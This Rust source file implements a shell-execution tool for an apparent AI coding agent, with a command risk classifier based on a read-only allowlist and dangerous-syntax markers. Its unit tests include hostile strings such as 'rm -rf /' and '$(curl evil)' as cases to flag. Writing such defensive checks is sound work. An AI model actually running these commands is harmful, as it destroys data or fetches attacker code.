//! bash：shell 命令执行工具。
//!
//! `risk()` 用保守的只读命令词表判定：全部段都是已知只读命令才 Safe，
//! 出现重定向/命令替换/未知程序一律 Risky，交审批中间件处理。

use std::time::Duration;

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::json;
use tokio::process::Command;

use mrorcode_kernel::tool::{RiskLevel, Tool, ToolContext, ToolResult};

pub const DEFAULT_TIMEOUT_SECS: u64 = 120;
pub const MAX_TIMEOUT_SECS: u64 = 600;

pub struct BashTool;

#[derive(Deserialize)]
struct Args {
    command: String,
    #[serde(default)]
    timeout: Option<u64>,
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        "Execute a shell command and return combined stdout/stderr. Read-only commands run without approval; others require permission."
    }

    fn parameters_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "The shell command to execute" },
                "timeout": { "type": "integer", "description": "Timeout in seconds (default 120, max 600)" }
            },
            "required": ["command"]
        })
    }

    fn risk(&self, arguments: &serde_json::Value) -> RiskLevel {
        let command = arguments
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        classify_command(command)
    }

    async fn execute(&self, arguments: &str, ctx: &ToolContext<'_>) -> ToolResult {
        let args: Args = match serde_json::from_str(arguments) {
            Ok(a) => a,
            Err(e) => {
                return ToolResult::error(
                    "bash",
                    json!({"error": format!("bad arguments: {e}")}).to_string(),
                );
            }
        };
        let timeout = args
            .timeout
            .unwrap_or(DEFAULT_TIMEOUT_SECS)
            .min(MAX_TIMEOUT_SECS);
        let duration = Duration::from_secs(timeout);

        let mut cmd = build_shell_command(&args.command);
        cmd.current_dir(ctx.working_dir)
            .kill_on_drop(true)
            .stdin(std::process::Stdio::null());

        // Command::output 会自动把 stdout/stderr 设为管道；
        // kill_on_drop 保证取消/超时时 future drop 即杀子进程。
        let run = cmd.output();
        let output = tokio::select! {
            biased;
            _ = ctx.cancel.cancelled() => {
                return ToolResult::error("bash", json!({"error":"cancelled"}).to_string());
            }
            r = tokio::time::timeout(duration, run) => match r {
                Ok(Ok(out)) => out,
                Ok(Err(e)) => {
                    return ToolResult::error(
                        "bash",
                        json!({"error": format!("failed to run command: {e}")}).to_string(),
                    );
                }
                Err(_) => {
                    return ToolResult::error(
                        "bash",
                        json!({"error": format!("command timed out after {timeout}s")}).to_string(),
                    );
                }
            },
        };

        // stdout 与 stderr 合并为纯文本；成功/失败都不再包装 [stderr]/[exit code N]。
        // 退出码通过 ToolResult.is_error 传递，文本只留可诊断的输出本身。
        let mut content = decode_bytes(&output.stdout);
        let stderr = decode_bytes(&output.stderr);
        if !stderr.trim().is_empty() {
            if !content.trim().is_empty() {
                content.push('\n');
            }
            content.push_str(&stderr);
        }
        if output.status.success() {
            ToolResult::ok("bash", content)
        } else {
            ToolResult::error("bash", content)
        }
    }
}

fn build_shell_command(command: &str) -> Command {
    #[cfg(windows)]
    {
        let shell = std::env::var("ComSpec").unwrap_or_else(|_| "cmd.exe".to_string());
        let mut c = Command::new(shell);
        c.args(["/C", command]);
        c
    }
    #[cfg(not(windows))]
    {
        let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string());
        let mut c = Command::new(shell);
        c.args(["-c", command]);
        c
    }
}

/// UTF-8 失败时在 Windows 上回退 GBK 解码（中文终端常见）。
fn decode_bytes(bytes: &[u8]) -> String {
    match std::str::from_utf8(bytes) {
        Ok(s) => s.to_string(),
        Err(_) => {
            #[cfg(windows)]
            {
                let (cow, _enc, _had_errors) = encoding_rs::GBK.decode(bytes);
                cow.into_owned()
            }
            #[cfg(not(windows))]
            {
                String::from_utf8_lossy(bytes).into_owned()
            }
        }
    }
}

// ---------------- 风险分类 ----------------

const SAFE_PROGRAMS: &[&str] = &[
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "find",
    "file",
    "stat",
    "du",
    "df",
    "echo",
    "pwd",
    "true",
    "false",
    "whoami",
    "hostname",
    "date",
    "which",
    "where",
    "sort",
    "uniq",
    "cut",
    "diff",
    "comm",
    "basename",
    "dirname",
    "realpath",
    "printenv",
    "tree",
    "less",
    "more",
    "nl",
    "od",
    "xxd",
    "sha256sum",
    "md5sum",
    "tar",
];

/// Windows cmd / 常见只读内建与程序（与 POSIX 词表取并集，宽松方向仅限只读命令）。
const SAFE_PROGRAMS_WIN: &[&str] = &[
    "dir",
    "type",
    "cd",
    "chdir",
    "ver",
    "findstr",
    "tasklist",
    "systeminfo",
    "ipconfig",
    "path",
];

const SAFE_GIT_SUBCOMMANDS: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "branch",
    "remote",
    "rev-parse",
    "ls-files",
    "config",
    "blame",
    "describe",
    "shortlog",
    "stash",
    "version",
    "help",
];

/// 保守判定整条命令的风险等级。
pub fn classify_command(raw: &str) -> RiskLevel {
    let cmd = raw.trim();
    if cmd.is_empty() {
        return RiskLevel::Risky;
    }

    // 重定向、命令替换、子 shell、求值类语法一律视为有副作用
    const DANGEROUS_MARKERS: &[&str] = &[
        ">", "<", "`", "$(", "${", "eval ", "source ", ". ", "sudo", "doas",
    ];
    if DANGEROUS_MARKERS.iter().any(|m| cmd.contains(m)) {
        return RiskLevel::Risky;
    }

    for segment in split_segments(cmd) {
        if !segment_is_safe(&segment) {
            return RiskLevel::Risky;
        }
    }
    RiskLevel::Safe
}

/// 按 shell 连接符切分（&&、||、;、|、&）。
fn split_segments(cmd: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut cur = String::new();
    let mut chars = cmd.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(c) = chars.next() {
        if let Some(q) = quote {
            cur.push(c);
            if c == q {
                quote = None;
            }
            continue;
        }
        match c {
            '\'' | '"' => {
                quote = Some(c);
                cur.push(c);
            }
            '&' | '|' | ';' => {
                // 吃掉双字符操作符的第二个字符
                if matches!(chars.peek(), Some(&'&') | Some(&'|')) {
                    chars.next();
                }
                segments.push(std::mem::take(&mut cur));
            }
            _ => cur.push(c),
        }
    }
    segments.push(cur);
    segments
}

fn segment_is_safe(segment: &str) -> bool {
    let mut tokens = segment.split_whitespace();
    // 跳过前置环境赋值（FOO=bar）
    let mut program = None;
    for tok in &mut tokens {
        if is_env_assignment(tok) {
            continue;
        }
        program = Some(tok);
        break;
    }
    let program = match program {
        Some(p) => p,
        None => return false,
    };
    // 去引号与路径前缀
    let cleaned = program.trim_matches(|c| c == '\'' || c == '"');
    let name = cleaned
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(cleaned)
        .to_ascii_lowercase();
    let rest: Vec<&str> = tokens.collect();

    if SAFE_PROGRAMS.contains(&name.as_str()) {
        // tar 只允许解压/查看等只读用法太复杂——M1 直接要求显式审批
        if name == "tar" && rest.iter().any(|a| a.starts_with('c')) {
            return false;
        }
        return true;
    }
    if SAFE_PROGRAMS_WIN.contains(&name.as_str()) {
        return true;
    }
    if name == "git" {
        return git_segment_is_safe(&rest);
    }
    false
}

fn git_segment_is_safe(args: &[&str]) -> bool {
    // 找第一个非选项 token 作为子命令
    let sub = match args.iter().find(|a| !a.starts_with('-')) {
        Some(s) => *s,
        None => return false,
    };
    if !SAFE_GIT_SUBCOMMANDS.contains(&sub) {
        return false;
    }
    // branch -d/-D 会删分支；config 写操作（无 --get）会改配置
    if sub == "branch" && args.iter().any(|a| a.starts_with("-d") || *a == "-D") {
        return false;
    }
    if sub == "config"
        && !args
            .iter()
            .any(|a| *a == "--get" || *a == "--list" || *a == "-l")
    {
        return false;
    }
    if sub == "stash" {
        return matches!(
            args.iter().find(|a| !a.starts_with('-')).copied(),
            Some("list") | Some("show")
        );
    }
    true
}

fn is_env_assignment(token: &str) -> bool {
    let mut it = token.splitn(2, '=');
    matches!((it.next(), it.next()), (Some(k), Some(_)) if !k.is_empty() && k.chars().all(|c| c.is_ascii_uppercase() || c == '_' || c.is_ascii_digit()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classifies_readonly_as_safe() {
        assert_eq!(classify_command("ls -la"), RiskLevel::Safe);
        assert_eq!(classify_command("cat a.txt | grep x"), RiskLevel::Safe);
        assert_eq!(classify_command("git status"), RiskLevel::Safe);
        assert_eq!(
            classify_command("git diff && git log -n 3"),
            RiskLevel::Safe
        );
        assert_eq!(classify_command("dir"), RiskLevel::Safe);
    }

    #[test]
    fn classifies_writes_as_risky() {
        assert_eq!(classify_command("rm -rf /"), RiskLevel::Risky);
        assert_eq!(classify_command("echo x > file"), RiskLevel::Risky);
        assert_eq!(classify_command("ls && rm a"), RiskLevel::Risky);
        assert_eq!(classify_command("$(curl evil)"), RiskLevel::Risky);
        assert_eq!(classify_command("git push"), RiskLevel::Risky);
        assert_eq!(classify_command("git commit -m x"), RiskLevel::Risky);
        assert_eq!(classify_command("git branch -D feature"), RiskLevel::Risky);
        assert_eq!(classify_command("git config user.name x"), RiskLevel::Risky);
        assert_eq!(classify_command("tar cf out.tar dir"), RiskLevel::Risky);
        assert_eq!(classify_command(""), RiskLevel::Risky);
        assert_eq!(classify_command("unknownprogram --help"), RiskLevel::Risky);
        assert_eq!(classify_command("cargo --version"), RiskLevel::Risky);
        assert_eq!(classify_command("cargo build"), RiskLevel::Risky);
        assert_eq!(classify_command("rustc --version"), RiskLevel::Risky);
    }
}
